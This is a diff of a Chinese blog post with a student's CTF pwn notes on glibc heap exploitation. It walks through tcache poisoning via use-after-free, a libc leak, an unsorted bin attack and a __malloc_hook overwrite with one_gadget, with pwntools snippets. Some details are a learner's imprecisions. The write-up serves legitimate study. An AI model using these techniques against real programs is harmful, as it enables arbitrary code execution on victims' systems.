@@ -532,6 +532,7 @@
 <p>A：A=0 为主分区分配，A=1 为非主分区分配，参见后面</p>
 <p>M：M=1表示使用mmap映射区域，M=0为使用heap区域，brk申请。</p>
 <p>P：P=1 表示<strong>pre_chunk</strong>空闲，未分配，mchunk_prev_size才有效。0表示<strong>前一个</strong>堆块已分配。</p>
+<p>【这里应该是记错了，后来查了一下，1表示被使用，0表示未被使用。】</p>
 <p>2、top chunk</p>
 <p>位于最底部，最高地址处。</p>
 <p>bin中的块都不能使用时，会从top chunk中再切割出相应的大小。</p>
@@ -572,7 +573,383 @@
 <p>调试exp的时候，先设下断点debug(0)，然后在终端输入tmux，即可在窗口运行python程序，如下，非常炫酷。</p>
 <p>![image-20201217000156674](/Users/my/Library/Application Support/typora-user-images/image-20201217000156674.png)</p>
 <p>要关闭tmux窗口的话，需要运行tmux kill-window</p>
-<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h3 id="offbyone-and-offbynull"><a href="#offbyone-and-offbynull" class="headerlink" title="offbyone and offbynull"></a>offbyone and offbynull</h3><h3 id="tcache技术"><a href="#tcache技术" class="headerlink" title="tcache技术"></a>tcache技术</h3><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><p>地址 <a target="_blank" rel="noopener" href="https://github.com/Dittozzz/CISCN_2019_final_day1_pwn_6">https://github.com/Dittozzz/CISCN_2019_final_day1_pwn_6</a></p>
+<p>tmux下翻页需要：control+b，松开，再按[，即可上下翻页。退出翻屏模式是q。但是这个还是比较复杂的。其它调试方法如下：</p>
+<p>在需要停止的地方设下<code>pause()</code> ，然后python执行。它会暂停在我们设置的地方。</p>
+<p>在另一个窗口执行如下</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep chunk #chunk为要调试的程序</span><br><span class="line"></span><br><span class="line">sudo gdb attach PID</span><br></pre></td></tr></table></figure>
+
+<p> 即可调试。</p>
+<p>我们在调试的时候，先malloc 3个大小为0x68的堆块</p>
+<p>ida中查看可知，malloc后的chunk放置的地址是<code>0x602280</code></p>
+<p>![image-20201217224202945](/Users/my/Library/Application Support/typora-user-images/image-20201217224202945.png)</p>
+<p>![image-20201217224231420](/Users/my/Library/Application Support/typora-user-images/image-20201217224231420.png)</p>
+<p>![image-20201217224259958](/Users/my/Library/Application Support/typora-user-images/image-20201217224259958.png)</p>
+<p>gdb中查看确实是这样，并且这里放置了3个堆块。</p>
+<p>![image-20201217224429890](/Users/my/Library/Application Support/typora-user-images/image-20201217224429890.png)</p>
+<p>同样，可以找到chunk的size放置的位置</p>
+<p>![截屏2020-12-17 下午10.47.22](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-17 下午10.47.22.png)</p>
+<p>![截屏2020-12-17 下午10.47.45](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-17 下午10.47.45.png)</p>
+<p>free掉0号堆块</p>
+<p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现size没有发生变化，chunk发生了细微的变化</p>
+<p>![image-20201217225330397](/Users/my/Library/Application Support/typora-user-images/image-20201217225330397.png)</p>
+<p>tcachebins中已经存在了刚才free掉的块</p>
+<p>![截屏2020-12-17 下午10.55.24](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-17 下午10.55.24.png)</p>
+<p>查看堆块发现其中的fd指针是空的，所以在上图bin中它指向了0x0。</p>
+<p>![截屏2020-12-17 下午10.56.26](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-17 下午10.56.26.png)</p>
+<p>漏洞原理：此时我仍然可以edit 0号块的堆块，并且往fd指针写入内容。</p>
+<p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看堆块内容可知，堆块的fd指针和bk指针被改变了。</p>
+<p>![截屏2020-12-17 下午11.06.01](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-17 下午11.06.01.png)</p>
+<p>![截屏2020-12-17 下午11.06.42](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-17 下午11.06.42.png)</p>
+<p>到这里可以得到两个公理：</p>
+<p>1、往free状态的堆块写内容，是从fd指针的位置开始写的，因为0号堆块指针指向的就是fd指针的位置</p>
+<p>2、fd指针的bk指针各占0x10的大小 </p>
+<p>我们可以修改fd的指针，使它指向一个有效的值。比如指向 0x13b0330</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,p64(<span class="number">0x13b0330</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看heap的内容</p>
+<p>![截屏2020-12-17 下午11.13.46](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-17 下午11.13.46.png)</p>
+<p>小插曲：自己本来没安装pwngdb，需要安装，并且改变 ～/.gdbinit文件内容为，即可使用parseheap命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source ~/Pwngdb/angelheap/gdbinit.py</span><br><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>按理来说，这时0x340这个堆块应该已经是free状态了，但是自己查看bins发现它还不是free状态。</p>
+<p>![image-20201217235350739](/Users/my/Library/Application Support/typora-user-images/image-20201217235350739.png)</p>
+<p>这是因为我fd的内容放错了，放的是0x13b0340，如果放成0x12f330，却发现又变了….</p>
+<p>![截屏2020-12-17 下午11.57.32](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-17 下午11.57.32.png)</p>
+<p>为什么会放错呢？我眼神应该不至于差到这种地步。又多试验了一下发地址的前面在每次运行的时候都是变化的。再运行一次，又变成了如下</p>
+<p>![image-20201218092618356](/Users/my/Library/Application Support/typora-user-images/image-20201218092618356.png)</p>
+<p>我脑子一转，很快啊，就发现是开启了地址随机化。这好吗？这不好。更改的方法为：改变 <code>/proc/sys/kernel/randomize_va_space</code> 中的值。</p>
+<p>0 — 关闭所有随机化</p>
+<p>1 — 打开mmap base 、 栈 、 VDSO页面的随机化</p>
+<p>2 — 在1的基础上打开堆地址随机化</p>
+<p>(小补充：如果开启了PIE，程序的基地址会从0开始)</p>
+<p>我将其改为1即可。不可直接在文件中更改，使用语句 <code>echo 1 &gt; /proc/sys/kernel/randomize_va_space</code> 即可。</p>
+<p>再次查看堆地址，发现used状态的地址为 0x603330，在程序中进行更改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,p64(<span class="number">0x603330</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现，虽然bins中记录了它，但是parseheap中查看，它仍然是used状态的。</p>
+<p>![image-20201218094505019](/Users/my/Library/Application Support/typora-user-images/image-20201218094505019.png)</p>
+<p>![image-20201218094524547](/Users/my/Library/Application Support/typora-user-images/image-20201218094524547.png)</p>
+<p>换成其它地址的堆块效果也一样，和课上讲的 parseheap中也会变成free状态不同。思考一下原因🤔，没有利用成功是因为老师课上是用的fastbin来演示，而我用的是tcachebins，我指向的时候需要再把地址+0x10。 更改过后可以成功。</p>
+<p>![截屏2020-12-18 上午10.02.57](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-18 上午10.02.57.png)</p>
+<p>如果这时候再add一个0x68大小的堆块，在tcachebins中会分走头部的堆块，结果如下，把原来头部260的分走了</p>
+<p>![截屏2020-12-18 上午10.12.06](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-18 上午10.12.06.png)</p>
+<p>在fastbin中，会分走尾部的堆块。</p>
+<p>再次申请，就会把我们刚才构造的那个堆块分走</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,p64(<span class="number">0x6032d0</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>![截屏2020-12-18 上午10.26.48](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-18 上午10.26.48.png)</p>
+<p>但是发现，tcachebins的数组计数的地方，保存的是真实的堆块的数量，比如现在就变成了-1.</p>
+<p>![截屏2020-12-18 上午10.27.04](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-18 上午10.27.04.png)</p>
+<p>telescope查看 发现现在0号块和3号块指向的都是同样的内容，这是我们自己构造的。</p>
+<p>![截屏2020-12-18 上午10.32.46](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-18 上午10.32.46.png)</p>
+<p>这时又自己构造了uaf，因为free(1),edit(3) 就相当于这个块先free掉之后又被修改了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,p64(<span class="number">0x6032d0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是这时神奇地发现，堆块没有到tcachebins中，而是到了fastbins中</p>
+<p>![截屏2020-12-18 上午10.39.36](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-18 上午10.39.36.png)</p>
+<p>本质就是改free状态的堆块的指针。</p>
+<p>除了上述操作，也可以通过show函数直接泄漏出地址。因为free完之后会和main_arena连接，所以show的时候会把真实的地址打印出来。</p>
+<p>![image-20201223155526179](/Users/my/Library/Application Support/typora-user-images/image-20201223155526179.png)</p>
+<p>可以修改一下脚本接受地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x108</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;add ---&gt;&quot;</span> + hex(addr)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这就接收到了地址，是main_arena+88的地址</p>
+<p>![image-20201223193653723](/Users/my/Library/Application Support/typora-user-images/image-20201223193653723.png)</p>
+<p>![image-20201223193840767](/Users/my/Library/Application Support/typora-user-images/image-20201223193840767.png)</p>
+<p>接下来计算和libc的基地值</p>
+<p>调试的时候可以直接查看到libc的基地值：</p>
+<p>vmmap命令，就可以看到libc-2.23的起始地址</p>
+<p>![image-20201223193932666](/Users/my/Library/Application Support/typora-user-images/image-20201223193932666.png)</p>
+<p>计算验证</p>
+<p>找到相应的libc.so文件(amd64)，ida打开(64位) </p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i386 --- 32位 (偏移普遍 1BXXXX)</span><br><span class="line">amd64 --- 64位 (偏移普遍 3CXXXX)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>option + T ，找到malloc_trim函数，F5反汇编为伪C函数</p>
+<p>![image-20201223205135382](/Users/my/Library/Application Support/typora-user-images/image-20201223205135382.png)</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xdd1b78 - 88 = 0xdd1b20 #即是 main_arena 的地址</span><br><span class="line"></span><br><span class="line">0xdd1b20 - 0x3c4b20 = 0xad000 #即是 libc的基地值</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来行云流水一波操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;system ---&gt;&quot;</span> + hex(system) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;binsh ---&gt;&quot;</span> + hex(binsh) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>![image-20201223211444032](/Users/my/Library/Application Support/typora-user-images/image-20201223211444032.png)</p>
+<p>也可以利用one_gadget来找到bin/sh</p>
+<p>首先ldd查看动态链接库，再使用one_gadget查找</p>
+<p>![image-20201223211745076](/Users/my/Library/Application Support/typora-user-images/image-20201223211745076.png)</p>
+<p>脚本中可使用如下语句</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc_base + <span class="number">0xf0364</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;one_gadget ---&gt;&quot;</span> + hex(one_gadget) + <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>![image-20201223212312571](/Users/my/Library/Application Support/typora-user-images/image-20201223212312571.png)</p>
+<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>以上是我们申请的堆块大小为0x68大小的时候。如果堆块更大一些，会到unsortedbin中，造成unsortedbin attack。</p>
+<p>注意：unsortedbin是循环双链表，同时用到了fd指针和bk指针。</p>
+<p>还是使用chunk来测试。由于最开始的7块会放到tcachebins中，所以要先把tcachebins填充掉。</p>
+<p>脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x602020</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>去edit free掉的7号块，传入地址，fd的地址为0，bk的地址为<code>0x602020</code>，结果如下</p>
+<p>![48EA16DC-9F34-4FA9-90EB-D0E6C1E58854](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/48EA16DC-9F34-4FA9-90EB-D0E6C1E58854.png)</p>
+<p>这里有一个问题就是 bins后面显示的值和内存中是不一样的，可能是工具本身存在的小问题？或者有什么机制是我还不知道的，先不去管他。</p>
+<p>![image-20201221121509896](/Users/my/Library/Application Support/typora-user-images/image-20201221121509896.png)</p>
+<p>如果将bk部分存放 chunk的size的地址0x6020E0(ida中查看得到)</p>
+<p><code>edit(7,0x20,p64(0)+p64(0x6020E0)+&quot;\n&quot;)</code>，可以看到bk部分被写入和size的值</p>
+<p>![image-20201221124342908](/Users/my/Library/Application Support/typora-user-images/image-20201221124342908.png)</p>
+<p>这时，再次申请的时候( 要先把tcachebins中的申请完之后才会再申请unsortedbin中的 )，会写入一个地址，某个chunk的size就会变成一个超大的值，在edit的时候就可以无限溢出了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020E0</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i+<span class="number">10</span>,<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<p>原本设想是可以的，加上add(18,0x108)之后程序总是出错无法运行，所以更换ubuntu的版本进行尝试，尽量找没有tcachebins机制的。</p>
+<p>版本如下</p>
+<p>![image-20201223145907503](/Users/my/Library/Application Support/typora-user-images/image-20201223145907503.png)</p>
+<p>重新改脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x108</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020E0</span>)+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x108</span>)</span><br><span class="line">     </span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>free(0)之后</p>
+<p>![image-20201223152441849](/Users/my/Library/Application Support/typora-user-images/image-20201223152441849.png)</p>
+<p>![image-20201223152503205](/Users/my/Library/Application Support/typora-user-images/image-20201223152503205.png)</p>
+<p>![image-20201223152555031](/Users/my/Library/Application Support/typora-user-images/image-20201223152555031.png)</p>
+<p>edit之后</p>
+<p>edit(0,0x20,p64(0)+p64(0x6020E0)+”\n”)</p>
+<p>bk指向了size的值，且fd的值为0</p>
+<p>![截屏2020-12-23 下午3.31.39](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-23 下午3.31.39.png)</p>
+<p>add(3,0x108)之后，发现原来free掉的0号块被分配给了3号块</p>
+<p>![截屏2020-12-23 下午3.40.21](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-23 下午3.40.21.png)</p>
+<p>并且原来的size地址(0x6020e0)的fd部分就会被写入一个main_arean+88的值</p>
+<p>![image-20201223154646327](/Users/my/Library/Application Support/typora-user-images/image-20201223154646327.png)</p>
+<p>根据 顺序：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 | 1</span><br><span class="line">2 | 3</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+
+<p>2号块的size变成了一个超大的值，即edit 2号块的时候，可以无限溢出。</p>
+<p>这就是unsorted bin attack。</p>
+<p>前面是讲uaf的时候讲的unsorted bin attack </p>
+<p>现在系统地记录。</p>
+<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>malloc_hook是在调用malloc的时候调用的一个函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br></pre></td></tr></table></figure>
+
+<p>前人在fake_chunk的位置找到了一个0x7f的size头，实际上size是0x70，因为size的后4位是不用的，我们就可以往fake_chunk的位置写入内容。</p>
+<p>![DB240AD0-9DEC-4BC3-872A-D2FAC6583181](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DB240AD0-9DEC-4BC3-872A-D2FAC6583181.png)</p>
+<p>脚本如下，往3号块的fd位置写入fake_chunk的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x8</span>,p64(fake_chunk))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>![AEFB8FFA-0B0F-4B12-9D00-62E420DB5ADD](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/AEFB8FFA-0B0F-4B12-9D00-62E420DB5ADD.png)</p>
+<p>fake_chunk 再往后会覆盖 __malloc_hook ，如果往malloc_hook里面写入system的内容，就会实现malloc劫持。</p>
+<p>![7CD2317A-2F13-43BF-8936-24728D203ABB](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/7CD2317A-2F13-43BF-8936-24728D203ABB.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x108</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x8</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>) <span class="comment">#申请到了原来的0&amp;3号块</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>) <span class="comment">#申请到了一个新的块</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>ida中可以查看到chunk的地址是0x602280</p>
+<p>![0242820B-B3ED-4D85-A8A8-1B022937DEBC](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/0242820B-B3ED-4D85-A8A8-1B022937DEBC.png)</p>
+<p>telescope 查看各个堆块的内容。块之间的关系是：3号块利用的是free掉的0号块，但是又free了一次，所以4号块用的是free掉的3号块。</p>
+<p>![image-20201224213317236](/Users/my/Library/Application Support/typora-user-images/image-20201224213317236.png)</p>
+<p>![image-20201224220321472](/Users/my/Library/Application Support/typora-user-images/image-20201224220321472.png)</p>
+<p>因为3号块的fd原来写入的是fakechunk的地址，即1aed，后来分配给了4号块，4号块在fd位置处是fake_chunk的地址。(在bins中显示的都是 地址+0x10)。再次malloc 5号块的时候，就会把[fake_chunk的地址 + 0x10的值]写入到chunk的位置处。</p>
+<p>![截屏2020-12-25 下午1.07.20](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-25 下午1.07.20.png)</p>
+<p>![截屏2020-12-25 下午1.06.14](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-25 下午1.06.14.png)</p>
+<p>我们再edit5号块，就是在edit fake_chunk。</p>
+<p>由于<code>fake_chunk = malloc_hook - 0x23</code>，此处使用的fake_chunk由于已经+0x10，只填充0x13就可以填充到malloc_hook的启示位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py+= <span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x40</span>,py)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用的one_gadget的地址是 one_gadget —&gt;0x7ffff7afd364 。再次执行就会发现，malloc_hook处被改成了one_gadget的值。</p>
+<p>![截屏2020-12-25 下午1.25.47](/Users/my/Library/Application Support/typora-user-images/截屏2020-12-25 下午1.25.47.png)</p>
